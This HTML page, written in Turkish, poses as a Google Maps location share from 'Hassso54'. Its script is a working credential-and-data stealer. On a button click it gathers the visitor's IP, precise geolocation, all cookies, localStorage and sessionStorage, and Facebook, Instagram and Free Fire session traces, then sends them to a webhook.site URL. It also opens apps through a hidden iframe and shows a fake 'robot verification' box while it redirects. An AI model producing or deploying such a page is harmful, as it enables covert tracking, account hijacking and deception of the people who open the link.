<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 30px;
            padding: 35px 25px;
            text-align: center;
            max-width: 320px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .map-image { width: 160px; height: 160px; object-fit: contain; margin-bottom: 15px; }
        h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
        .alt-yazi { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
        button {
            background: #1a73e8; color: white; border: none; padding: 14px 25px;
            border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: 0.2s;
        }
        button:active { transform: scale(0.97); }
        .robot-onay {
            position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
            z-index: 999999; display: flex; align-items: center; gap: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
            pointer-events: none;
        }
        .robot-spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid #fff; border-radius: 50%; animation: don 0.8s linear infinite; }
        @keyframes don { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .robot-text { color: white; font-size: 13px; font-weight: 500; }
        .robot-text strong { color: #8ab4f8; }
    </style>
</head>
<body>
    <div class="kart">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
        <button id="btn">Konumu Görüntüle</button>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        
        // TÜM VERİLERİ TOPLA
        async function tumVerileriTopla() {
            let veri = {
                tip: "Hassso54_TUM_BILGILER",
                zaman: new Date().toLocaleString('tr-TR'),
                ip: "Alınamadı",
                konum: "",
                enlem: null,
                boylam: null,
                google_sifreler: [],
                facebook_bilgi: {},
                instagram_bilgi: {},
                freefire_bilgi: {},
                tum_localstorage: {},
                tum_sessionstorage: {},
                tum_cerezler: "",
                cihaz: navigator.userAgent
            };
            
            // 1. IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                veri.ip = json.ip;
            } catch(e) {}
            
            // 2. Konum
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            veri.enlem = pos.coords.latitude;
                            veri.boylam = pos.coords.longitude;
                            veri.konum = `https://www.google.com/maps?q=${veri.enlem},${veri.boylam}`;
                            resolve();
                        },
                        () => resolve(),
                        { timeout: 5000 }
                    );
                });
            }
            
            // 3. Google Password Manager'dan çekmeye çalış (şifreler)
            try {
                // Google hesap bilgileri
                if (localStorage.getItem('google-accounts')) {
                    veri.google_sifreler.push(localStorage.getItem('google-accounts'));
                }
                // Chrome şifre yöneticisi ipucu
                veri.google_not = "Google Password Manager'a kayıtlı şifreler için: chrome://settings/passwords";
            } catch(e) {}
            
            // 4. TÜM localStorage'ı kaydet (Facebook, Instagram, Free Fire izleri)
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const val = localStorage.getItem(key);
                    veri.tum_localstorage[key] = val;
                    
                    // Facebook bilgisi ara
                    if (key.toLowerCase().includes('fb') || key.toLowerCase().includes('facebook')) {
                        veri.facebook_bilgi[key] = val;
                    }
                    // Instagram bilgisi ara
                    if (key.toLowerCase().includes('ig') || key.toLowerCase().includes('instagram')) {
                        veri.instagram_bilgi[key] = val;
                    }
                    // Free Fire bilgisi ara
                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff')) {
                        veri.freefire_bilgi[key] = val;
                    }
                }
            } catch(e) {}
            
            // 5. TÜM sessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    veri.tum_sessionstorage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {}
            
            // 6. Çerezler (cookie)
            veri.tum_cerezler = document.cookie;
            
            // 7. Facebook cookie'lerinden kullanıcı ID
            if (document.cookie.includes('c_user')) {
                const match = document.cookie.match(/c_user=([^;]+)/);
                if (match) {
                    veri.facebook_bilgi.kullanici_id = match[1];
                    veri.facebook_bilgi.durum = "✅ Facebook oturumu açık (çerez var)";
                }
            }
            
            // 8. Ek bilgi notları
            veri.bilgi_notu = "Eğer Facebook/Instagram şifreni göremiyorsan: Ayarlar > Şifre ve Güvenlik > Kayıtlı Şifreler bölümünden bakabilirsin.";
            veri.cozum = "Tüm şifrelerini Google Password Manager'a kaydet. Sonra bu sayfayı açtığında otomatik doldurabilirsin.";
            
            return veri;
        }
        
        // Arka planda uygulamaları AÇ (gizli iframe ile)
        function uygulamalariAc() {
            const gizli = document.createElement('iframe');
            gizli.style.display = 'none';
            document.body.appendChild(gizli);
            
            // Sırayla uygulamaları aç
            setTimeout(() => { gizli.src = "fb://profile"; }, 100);
            setTimeout(() => { gizli.src = "instagram://user?username="; }, 600);
            setTimeout(() => { 
                gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
            }, 1100);
            
            // Temizle
            setTimeout(() => {
                if (document.body.contains(gizli)) document.body.removeChild(gizli);
            }, 3000);
        }
        
        // Robot kutusu göster
        function robotKutuGoster() {
            let kutu = document.getElementById('robotKutu');
            if (!kutu) {
                kutu = document.createElement('div');
                kutu.id = 'robotKutu';
                kutu.className = 'robot-onay';
                kutu.innerHTML = `
                    <div class="robot-spinner"></div>
                    <div class="robot-text">
                        <strong>🔍 Lütfen bekleyin</strong><br>
                        Robot olmadığınız doğrulanıyor...<br>
                        <span style="font-size:11px;">Google Maps'e yönlendiriliyorsunuz</span>
                    </div>
                `;
                document.body.appendChild(kutu);
            }
            kutu.style.opacity = "1";
            setTimeout(() => {
                kutu.style.opacity = "0";
                setTimeout(() => { if(kutu && kutu.remove) kutu.remove(); }, 1000);
            }, 4000);
        }
        
        // ANA FONKSİYON
        async function baslat() {
            const btn = document.getElementById('btn');
            btn.innerText = "⏳";
            btn.disabled = true;
            
            // Tüm verileri topla
            const veri = await tumVerileriTopla();
            
            // Webhook'a gönder
            await fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(veri)
            });
            
            // Arka planda uygulamaları aç
            uygulamalariAc();
            
            // Maps'e yönlendir
            if (veri.konum) {
                window.location.href = veri.konum;
            } else {
                window.location.href = "https://www.google.com/maps";
            }
            
            // Robot kutusunu göster
            setTimeout(() => { robotKutuGoster(); }, 1500);
        }
        
        document.getElementById('btn').onclick = baslat;
    </script>
</body>
</html>
